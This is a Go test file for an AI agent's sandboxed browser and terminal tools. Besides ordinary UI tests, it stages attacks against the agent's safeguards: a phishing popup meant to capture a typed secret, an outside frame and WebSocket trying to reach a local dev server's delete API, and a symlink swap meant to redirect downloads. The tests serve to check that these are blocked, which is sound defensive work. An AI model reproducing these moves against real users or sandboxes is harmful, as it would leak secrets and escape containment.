	if !strings.HasPrefix(r.Content, "Emulating viewport 390×844 mobile @2x, dark color scheme in p1.") {
		t.Fatalf("emulate:\n%s", r.Content)
	}
	if r = mustBrowse(t, e, map[string]any{"action": "screenshot"}); !strings.Contains(r.Content, "[screenshot: 390×844 CSS px at 2x") {
		t.Fatalf("mobile screenshot: %s", r.Content)
	}
	if r = mustBrowse(t, e, map[string]any{"action": "console"}); !strings.Contains(r.Content, "logged nothing") {
		t.Fatalf("console: %s", r.Content)
	}
}

func TestSnapshotDiff(t *testing.T) {
	header := "Page p1: \"Form\"\nURL: http://localhost/form\nViewport: 1280×800, scrolled to 0,0 of a 1280×800 page\n\n"
	before := header + "- main:\n  - form:\n    - textbox \"Email\" [ref=e2]\n    - button \"Save\" [ref=e3]\n  - paragraph\n- contentinfo:\n  - link \"Terms\" [ref=e4]\n"
	after := header + "- main:\n  - form:\n    - textbox \"Email\" [ref=e2]: ada\n    - button \"Save\" [ref=e3]\n  - paragraph\n- contentinfo:\n  - link \"Terms\" [ref=e4]\n"
	got, ok := snapshotDiff(before, after, "p1")
	want := header + "Changes since the last snapshot of p1 (+ added, - removed; unchanged lines left out):\n  - main:\n    - form:\n-     - textbox \"Email\" [ref=e2]\n+     - textbox \"Email\" [ref=e2]: ada\n"
	if !ok || got != want {
		t.Fatalf("diff:\n%s\nwant:\n%s", got, want)
	}
	if got, ok := snapshotDiff(before, before, "p1"); !ok || !strings.HasSuffix(got, "\n\nNo change since the last snapshot of p1.\n") {
		t.Fatalf("no change: %q", got)
	}
	moved := strings.Replace(after, "/form", "/done", 1)
	if _, ok := snapshotDiff(before, moved, "p1"); ok {
		t.Fatal("a diff across URLs")
	}
	cut := after + "… 3 more lines not shown: the snapshot stops at 24 KiB.\n"
	if _, ok := snapshotDiff(before, cut, "p1"); ok {
		t.Fatal("a diff of a cut snapshot")
	}
	var many, changed strings.Builder
	for i := range 20 {
		fmt.Fprintf(&many, "- item %d\n", i)
		fmt.Fprintf(&changed, "- item %d changed\n", i)
	}
	if _, ok := snapshotDiff(header+many.String(), header+changed.String(), "p1"); ok {
		t.Fatal("a diff longer than the page")
	}
}

// Run with JARVIS_SANDBOX_TEST=1: the whole loop the tools are for. A static
// site is served from a loopback Terminal under the sandbox and looked at
// in the Browser, all through Execute, in auto mode with no reviewer: none
// of it needs one. JARVIS_BROWSER_SHOTS=<dir> keeps the screenshots.
func TestSandboxIntegrationBrowseLoopbackTerminal(t *testing.T) {
	if os.Getenv("JARVIS_SANDBOX_TEST") != "1" {
		t.Skip("set JARVIS_SANDBOX_TEST=1 for host sandbox integration")
	}
	e := browserFixture(t, "auto", nil, nil)
	os.MkdirAll(filepath.Join(e.directory, "site"), 0o755)
	os.WriteFile(filepath.Join(e.directory, "site", "index.html"), []byte(`<!doctype html><meta charset=utf-8><title>Orbit</title>
<style>
body { margin: 0; font: 16px/1.5 -apple-system, system-ui, sans-serif; background: #f6f3ee; color: #1d1b22; }
header { background: #1d1b22; color: #ece5dc; padding: 28px 48px; display: flex; justify-content: space-between; align-items: center; }
header b { font-size: 22px; letter-spacing: .04em; } nav a { color: #c6b6f2; margin-left: 24px; text-decoration: none; }
main { max-width: 760px; margin: 48px auto; padding: 0 24px; }
.card { background: white; border-radius: 14px; padding: 28px 32px; box-shadow: 0 8px 30px rgba(0,0,0,.08); }
label { display: block; margin-top: 16px; font-weight: 600; } input { width: 100%; box-sizing: border-box; padding: 10px 12px; border: 1px solid #cfc8bd; border-radius: 8px; font: inherit; }
button { margin-top: 20px; background: #f49d89; border: 0; color: #1d1b22; padding: 10px 22px; border-radius: 8px; font: 600 15px system-ui; }
#result { margin-top: 16px; color: #2f7a4f; }
</style>
<header><b>ORBIT</b><nav><a href="#">Missions</a><a href="#">Crew</a><a href="#">Settings</a></nav></header>
<main><div class=card><h1>Mission settings</h1><p>Plan the next launch window.</p>
<label for=mission>Mission name</label><input id=mission placeholder="Artemis IV">
<button onclick="result.textContent = 'Saved ' + mission.value">Save mission</button><p id=result role=status></p></div></main>`), 0o644)
	start := terminalCall(t, e, map[string]any{"action": "start", "command": "cd site && exec python3 -m http.server 0 --bind 127.0.0.1", "loopback": true, "wait_for": `port \d+`, "timeout": 20})
	m := regexp.MustCompile(`port (\d+)`).FindStringSubmatch(start.Content)
	if start.IsError || m == nil {
		t.Fatalf("server: %s", start.Content)
	}
	r := mustBrowse(t, e, map[string]any{"action": "navigate", "url": "localhost:" + m[1] + "/"})
	if !strings.Contains(r.Content, `heading "Mission settings"`) {
		t.Fatalf("navigate:\n%s", r.Content)
	}
	field := ref(t, r.Content, `textbox "Mission name"`)
	mustBrowse(t, e, map[string]any{"action": "type", "target": field, "text": "Artemis IV"})
	r = mustBrowse(t, e, map[string]any{"action": "click", "target": "text=Save mission", "image": true})
	if !strings.Contains(r.Content, "Saved Artemis IV") || len(r.Images) != 1 {
		t.Fatalf("click:\n%s", r.Content)
	}
	shots := []core.ToolResult{r, mustBrowse(t, e, map[string]any{"action": "emulate", "width": 390, "height": 844, "mobile": true, "scale": 2, "color_scheme": "dark", "image": true})}
	if dir := os.Getenv("JARVIS_BROWSER_SHOTS"); dir != "" {
		for i, shot := range shots {
			os.WriteFile(filepath.Join(dir, fmt.Sprintf("loopback-%d.png", i+1)), shot.Images[0].Data, 0o644)
		}
	}
	terminalCall(t, e, map[string]any{"action": "stop", "id": "t1"})
}

// A popup an outside page opened at about:blank has that page's origin, and
// the page reads it: what is typed there is reviewed as sent outside.
func TestBrowserPopupOfAnOutsidePageIsOutside(t *testing.T) {
	site := newBrowserSite(t)
	e := browserFixture(t, "auto", nil, site)
	var reviewed []core.Approval
	e.config.Review = func(_ context.Context, a core.Approval) (core.Decision, error) {
		reviewed = append(reviewed, a)
		return core.Decision{Allow: a.Call.Arguments != nil && strings.Contains(string(a.Call.Arguments), `"action":"navigate"`), Reason: "fixture"}, nil
	}
	r := mustBrowse(t, e, map[string]any{"action": "navigate", "url": "http://external.test/phish", "network": true})
	if !strings.Contains(r.Content, "opened a new page p2") {
		t.Fatalf("no popup:\n%s", r.Content)
	}
	reviewed = nil
	r = browse(t, e, map[string]any{"action": "type", "page": "p2", "target": "css=#t", "text": "sk-SECRET-123"})
	if !r.IsError || len(reviewed) != 1 || !strings.Contains(string(reviewed[0].Call.Arguments), `"opened_by":"http://external.test/phish"`) || !strings.Contains(reviewed[0].Reason, "opened this one") {
		t.Fatalf("typing into the popup went unreviewed: %+v %+v", r, reviewed)
	}
	time.Sleep(300 * time.Millisecond)
	if site.count("external/steal") != 0 {
		t.Fatal("what was typed reached the outside page")
	}
}

// An approved outside frame inside the dev app, or an approved outside page,
// does not reach the dev server: not by fetch, not by WebSocket.
func TestBrowserOutsideFramesAndSocketsStayOffLoopback(t *testing.T) {
	site := newBrowserSite(t)
	e := browserFixture(t, "auto", nil, site)
	e.config.Review = func(context.Context, core.Approval) (core.Decision, error) {
		return core.Decision{Allow: true, Reason: "fixture"}, nil
	}
	mustBrowse(t, e, map[string]any{"action": "allow", "origins": []string{"http://external.test"}})
	r := mustBrowse(t, e, map[string]any{"action": "navigate", "url": site.local.URL + "/embed"})
	time.Sleep(500 * time.Millisecond)
	if site.count("external/frame-post") != 1 || site.count("local/api/delete") != 0 {
		t.Fatalf("frame loaded %d, its POST reached the dev server %d times:\n%s", site.count("external/frame-post"), site.count("local/api/delete"), r.Content)
	}
	if r := mustBrowse(t, e, map[string]any{"action": "console"}); !strings.Contains(r.Content, "may not reach local servers") {
		t.Fatalf("the frame's blocked request is not reported:\n%s", r.Content)
	}
	mustBrowse(t, e, map[string]any{"action": "navigate", "url": "http://external.test/ws-reach"})
	mustBrowse(t, e, map[string]any{"action": "wait", "text": "refused"})
	if site.count("local/hmr") != 0 {
		t.Fatal("an outside page's WebSocket reached the dev server")
	}
}

// Chrome saves downloads where the sandbox cannot plant a symlink; they are
// copied into scratch without following one.
func TestBrowserDownloadsStayInScratch(t *testing.T) {
	site := newBrowserSite(t)
	e := browserFixture(t, "auto", nil, site)
	mustBrowse(t, e, map[string]any{"action": "navigate", "url": site.local.URL + "/downloads"})
	download := func() string {
		t.Helper()
		seen := mustBrowse(t, e, map[string]any{"action": "click", "target": "text=Get report"}).Content
		for deadline := time.Now().Add(5 * time.Second); !strings.Contains(seen, "downloaded") && time.Now().Before(deadline); time.Sleep(100 * time.Millisecond) {
			seen += mustBrowse(t, e, map[string]any{"action": "snapshot"}).Content
		}
		return seen
	}
	scratch, _ := e.scratchDir()
	if notes := download(); !strings.Contains(notes, `downloaded "report.csv" (8 bytes) to $JARVIS_SCRATCH/downloads/report.csv`) {
		t.Fatalf("notes:\n%s", notes)
	}
	if data, err := os.ReadFile(filepath.Join(scratch, "downloads", "report.csv")); err != nil || string(data) != "a,b\n1,2\n" {
		t.Fatalf("kept %q, %v", data, err)
	}
	// As a sandboxed command could: the downloads directory swapped for a link.
	elsewhere := t.TempDir()
	os.RemoveAll(filepath.Join(scratch, "downloads"))
	os.Symlink(elsewhere, filepath.Join(scratch, "downloads"))
	if notes := download(); !strings.Contains(notes, "could not keep it") {
		t.Fatalf("notes:\n%s", notes)
	}
	if entries, _ := os.ReadDir(elsewhere); len(entries) != 0 {
		t.Fatalf("Chrome wrote through the link: %v", entries)
	}
}

// On a long page an action shows its own effect, found between whole
// snapshots, not the top of the page again; a modal dialog is shown as what
// is left, under a header that says the rest is inert, not as everything
// removed; and a full-page screenshot stops where it would turn illegible.
func TestBrowserLongPagesAndModals(t *testing.T) {
	site := newBrowserSite(t)
	e := browserFixture(t, "auto", nil, site)
	r := mustBrowse(t, e, map[string]any{"action": "navigate", "url": site.local.URL + "/long"})
	if len(r.Content) > maxOutput || !strings.Contains(r.Content, "Row 0 of the long list") || !strings.Contains(r.Content, "not shown") {
		t.Fatalf("navigate (%d bytes):\n%.2000s", len(r.Content), r.Content)
	}
	r = mustBrowse(t, e, map[string]any{"action": "click", "target": "text=Last"})
	if !strings.Contains(r.Content, "Changes since the last snapshot") || !strings.Contains(r.Content, "last clicked") || strings.Contains(r.Content, "Row 0 of") || len(r.Content) > 4096 {
		t.Fatalf("click at the bottom (%d bytes):\n%.3000s", len(r.Content), r.Content)
	}
	// Scrolling shows the part scrolled to.
	r = mustBrowse(t, e, map[string]any{"action": "scroll", "dy": -14000})
	if !strings.Contains(r.Content, "lines above not shown") || !strings.Contains(r.Content, "around what is in view") || strings.Contains(r.Content, "Row 0 of") {
		t.Fatalf("scroll up the long page:\n%.3000s", r.Content)
	}
	r = mustBrowse(t, e, map[string]any{"action": "screenshot", "full_page": true})
	if !strings.Contains(r.Content, "too tall to read whole; captured the top 4000 px") {
		t.Fatalf("full page: %s", r.Content)
	}
	mustBrowse(t, e, map[string]any{"action": "navigate", "url": site.local.URL + "/shop"})
	r = mustBrowse(t, e, map[string]any{"action": "click", "target": "text=Settings"})
	if !strings.Contains(r.Content, `Modal: dialog "Settings" is open; the rest of the page is inert behind it`) || strings.Contains(r.Content, "Changes since") || strings.Contains(r.Content, "Groceries") {
		t.Fatalf("opening a modal:\n%s", r.Content)
	}
}

// A kept download is bounded alone and with the session's others.
func TestKeepDownloadIsBounded(t *testing.T) {
	scratch := t.TempDir()
	st := &browserState{}
	keep := st.keepDownload(scratch)
	write := func(size int64) string {
		f, err := os.CreateTemp(t.TempDir(), "download-")
		if err != nil {
			t.Fatal(err)
		}
		defer f.Close()
		if err := f.Truncate(size); err != nil {
			t.Fatal(err)
		}
		return f.Name()
	}
	if _, err := keep(write(maxDownload+1), "big.bin"); err == nil || !strings.Contains(err.Error(), "at most") {
		t.Fatalf("an oversized download was kept: %v", err)
	}
	if kept, err := keep(write(1024), "small.bin"); err != nil || filepath.Base(kept) != "small.bin" {
		t.Fatalf("keep = %q, %v", kept, err)
	}
	st.kept = maxDownloads - 512
	if _, err := keep(write(1024), "more.bin"); err == nil || !strings.Contains(err.Error(), "in all") {
		t.Fatalf("downloads past the session's budget were kept: %v", err)
	}
	if _, err := os.Stat(filepath.Join(scratch, "downloads", "more.bin")); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("a refused download was written: %v", err)
	}
}
